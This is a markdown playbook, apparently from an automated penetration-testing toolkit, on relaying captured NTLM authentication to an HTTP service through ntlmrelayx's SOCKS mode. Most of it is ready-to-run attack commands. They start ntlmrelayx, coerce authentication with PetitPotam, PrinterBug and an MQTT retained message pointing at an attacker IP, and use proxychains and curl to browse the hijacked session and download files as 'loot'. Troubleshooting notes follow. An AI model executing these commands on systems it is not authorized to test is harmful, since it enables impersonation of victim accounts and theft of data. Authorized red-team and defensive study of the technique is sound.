# NTLM Relay to HTTP via SOCKS (ntlmrelayx)

## When to use

- You have captured NTLM credentials (Responder, MQTT coercion, PrinterBug, PetitPotam)
- The relay target is an HTTP service (IIS, web app with NTLM auth)
- You need to browse the authenticated session (download files, hit API endpoints)
- Direct relay with `-c` command execution is not possible or insufficient

## Tags

- ATT&CK: T1557.001 (LLMNR/NBT-NS Poisoning), T1187 (Forced Authentication)
- Platform: Windows
- Phase: exploit

## Setup inside the attackbox container

ntlmrelayx's `--socks` mode maintains the authenticated session server-side. You route
HTTP requests through the SOCKS proxy with proxychains.

### 1. Start ntlmrelayx with SOCKS

```bash
pk exec -- ntlmrelayx.py -t http://TARGET -smb2support --socks --no-http-server
```

- `-t http://TARGET`: the HTTP service to relay to
- `--socks`: enable SOCKS proxy (default port 1080)
- `--no-http-server`: don't start the HTTP server (avoids port conflicts)
- Add `-smb2support` if coercing SMB-based auth

ntlmrelayx listens on port 445 for incoming NTLM auth and on port 1080 for SOCKS.

### 2. Trigger NTLM authentication

Coerce the victim to connect to the attackbox's IP on port 445:

```bash
# PetitPotam
pk exec -- python3 PetitPotam.py ATTACKBOX_IP TARGET

# PrinterBug
pk exec -- python3 printerbug.py DOMAIN/USER:PASS@TARGET ATTACKBOX_IP

# MQTT retained message (if applicable)
pk exec -- mosquitto_pub -h TARGET -t 'trigger/topic' -r -m '\\ATTACKBOX_IP\share'
```

### 3. Verify the relay session

```bash
pk exec -- ntlmrelayx.py    # check the console output for "relay succeeded"
```

ntlmrelayx prints the relayed user and session status. Wait for a successful relay
before proceeding.

### 4. Browse via proxychains

Configure proxychains to use ntlmrelayx's SOCKS port:

```bash
# Ensure proxychains.conf points to 127.0.0.1:1080 (socks4)
pk exec -- bash -c 'echo "socks4 127.0.0.1 1080" > /tmp/proxychains-relay.conf'

# Browse the authenticated session
pk exec -- proxychains4 -f /tmp/proxychains-relay.conf curl -s http://TARGET/api/endpoint

# Download a file
pk exec -- proxychains4 -f /tmp/proxychains-relay.conf curl -s http://TARGET/api/download/file -o /workspace/engagements/SLUG/exploit/loot.zip
```

All requests through proxychains reuse the authenticated NTLM session that ntlmrelayx
maintains.

## Container networking gotchas

- ntlmrelayx must bind port 445. This works in the attackbox (runs as root) but NOT on
  an unprivileged pivot host.
- If running ntlmrelayx and the coercion tool in the same container, they share the
  network namespace; use 127.0.0.1 for the SOCKS proxy.
- proxychains + ntlmrelayx 0.14.0 can produce zombie processes. The attackbox uses tini
  as PID 1 to reap these, but if zombies accumulate, check with `ps aux | grep defunct`.
- If proxychains hangs, verify the SOCKS session is still alive in ntlmrelayx's console.
  Sessions expire if the target closes the connection.

## When this does NOT work

- Target requires NTLM signing on HTTP (rare but possible). Check response headers for
  `Negotiate` vs `NTLM` and signing requirements.
- Relayed session has expired or the target killed the connection. Re-trigger coercion.
- The HTTP app uses session cookies instead of per-request NTLM. In this case, capture
  the Set-Cookie from the first proxychains request and use it directly with curl.

## Topology reference

For relay attacks (ESC8, ESC11, RBCD, shadow creds):

```
Correct:
  Coerce target --> attackbox:445 (ntlmrelayx) --> relay to internal service
                    attackbox:1080 (SOCKS) <-- proxychains curl

Wrong:
  Coerce target --> pivot-host:445 (fails: unprivileged, cannot bind)
```

Run the relay server where you control privileged ports (attackbox), not on the pivot.
